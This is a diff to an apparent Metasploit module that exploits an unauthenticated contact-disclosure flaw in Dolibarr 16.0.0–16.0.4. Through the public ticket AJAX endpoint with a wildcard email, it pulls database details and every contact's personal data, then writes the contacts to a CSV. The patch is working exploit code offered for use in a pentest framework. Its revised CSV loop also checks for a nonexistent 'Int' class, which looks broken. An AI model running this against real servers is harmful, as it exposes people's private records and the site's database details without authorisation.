@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
+  include Msf::Module::Failure
 
   def initialize(info = {})
     super(
@@ -59,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_good("Response Code: #{res.code}")
     vprint_good("Response Body: #{res.body}")
 
-    /version=(?<version>\d+.*\.\d+)/ =~ res.body
+    /Dolibarr (?<version>\d+.*\.\d+)/ =~ res.body
     version = Rex::Version.new(version)
     if version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
       return [Exploit::CheckCode::Appears, version]
@@ -76,23 +77,18 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')
     }, 90, true)
-    vprint_line('--Exploit resquest--')
+    vprint_line('--Exploit request--')
     vprint_line("Domain: #{vhost}")
     vprint_line("Target_URI: #{normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')}")
 
     vprint_line('--Exploit response--')
-    begin
-      res_json_document = res.get_json_document['contacts']
-    rescue StandardError
-      return Exploit::CheckCode::Unknown
-    end
+
+    res_json_document = res.get_json_document['contacts']
 
     if res && res.code != 200
-      print_bad("Exploit response code: #{res.code}")
-      return Exploit::CheckCode::Unknown
-    elsif res_json_document.empty?
-      print_bad('Dolibarr database empty')
-      return Exploit::CheckCode::Unknown
+      fail_with(Failure::UnexpectedReply, "Exploit response code: #{res.code}")
+    elsif res_json_document.nil?
+      fail_with(Failure::UnexpectedReply, 'Dolibarr database empty')
     end
 
     vprint_good("Response Code: #{res.code}")
@@ -106,14 +102,9 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Database port: #{res_json_document[0]['db']['database_port']}")
     end
 
-    contact_entry = %w[
-      id country country_code state state_code region region_code note_public note_private note name lastname
-      firstname civility_id date_creation civility_code civility civilite address zip town poste email skype
-      twitter facebook linkedin jabberid photo phone_perso phone_mobile fax birthday ref_facturation
-      ref_contrat ref_commande user_login roles statut_commercial socname mail gender total_ht total_tva
-      total_localtax1 total_localtax2 total_ttc fk_bank fk_delivery_address fk_account cond_reglement
-      transport_mode_id barcode_type
-    ]
+    contact_fields = res.get_json_document['contacts'][0].keys
+    contact_fields.delete('db') # We do not want this in the csv
+
     contact_entry_data = []
 
     nbr_contact = res_json_document.length.to_i
@@ -121,19 +112,17 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Found #{nbr_contact} contacts.")
 
     csv_string = CSV.generate do |csv| # Loop to write into csv
-      csv << contact_entry
+      csv << contact_fields
       nbr_contact.times do |num| # Loop on every contact
-        contact_entry.each_with_index do |element, index_element|
-          begin
-            contact_entry_data << res_json_document[num][element].to_s.gsub("\r\n", ' ')
-          rescue StandardError
-            contact_entry_data << ' '
+        contact_fields.each do |element|
+          if res_json_document[num][element.to_s].is_a?(String) || res_json_document[num][element.to_s].is_a?(Int)
+            contact_entry_data << res_json_document[num][element.to_s].to_s.gsub("\r\n", ' ')
           end
-          if index_element == contact_entry.length - 1
-            csv << contact_entry_data
-            contact_entry_data.clear
-          end
+        rescue StandardError
+          contact_entry_data << ' '
         end
+        csv << contact_entry_data
+        contact_entry_data.clear
       end
     end
 
